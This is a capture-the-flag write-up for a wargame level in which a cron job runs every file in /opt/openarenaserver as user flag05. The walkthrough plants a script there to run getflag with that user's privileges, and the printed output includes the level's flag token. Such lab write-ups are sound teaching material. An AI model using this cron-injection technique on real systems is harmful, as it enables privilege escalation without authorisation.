## Level 05: Exploiting a Cron Task Vulnerability

### Goal  
Locate and exploit a vulnerability in a cron task to retrieve the flag for this level.

### Steps

1. **Locate the mail files**  
    Upon login, the following message appears:
    ```bash
    You have new mail.  
    ```
    Use the following command to search for mail directories:
    ```bash
    find / -name mail 2>/dev/null  
    ```
    Output:
    ```
    /usr/lib/byobu/mail
    /var/mail
    /var/spool/mail 
    /rofs/usr/lib/byobu/mail 
    /rofs/var/mail 
    /rofs/var/spool/mail
    ```

2. **List the contents of the directories**  
    To examine the files within these directories:
    ```bash
    ls `find / -name mail 2>/dev/null`
    ```
    Output:
    ```
    /rofs/usr/lib/byobu/mail  /usr/lib/byobu/mail  

    /rofs/var/mail:
    level05

    /rofs/var/spool/mail:
    level05

    /var/mail:
    level05 

    /var/spool/mail: 
    level05 
    ```
    The file `level05` appears in several directories.

3. **Read the content of the `level05` file**  
    Use the following command:
    ```bash
    cat /var/mail/level05
    ```
    Output:
    ```bash
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
    ```
    The format `*/2 * * * *` indicates a cron task.  
    - `su -c` is a command to switch users and execute a specific command, in this case under flag05.
    - The line specifies that every 2 minutes, the script `/usr/sbin/openarenaserver` will be executed as user `flag05`.

4. **Examine the script `/usr/sbin/openarenaserver`**   
    To understand its functionality:
    ```bash
    cat /usr/sbin/openarenaserver 
    ```
    Output:
    ```bash
    #!/bin/sh 
    for i in /opt/openarenaserver/* ; do 
        (ulimit -t 5; bash -x "$i") 
        rm -f "$i"
    done
    ```
    The script executes all files in `/opt/openarenaserver` with a 5-second timeout and deletes them afterward.

5. **Exploit the vulnerability**  
    To exploit this, create a file in `/opt/openarenaserver` that runs the `getflag` command:
    ```bash
    echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag05
    ```
    - This creates a file named `flag05` in `/opt/openarenaserver` containing the command `getflag > /tmp/flag05`. 
    - When the cron task runs, the script will execute the command and save the output of `getflag` to `/tmp/flag05`.

6. **Retrieve the flag**  
    Wait for 2 minutes for the cron task to execute and then read the output file:
    ```bash
    cat /tmp/flag05
    ```
    Output:
    ```bash
    Check flag.Here is your token : viuaaale9huek52boumoomioc
    ````
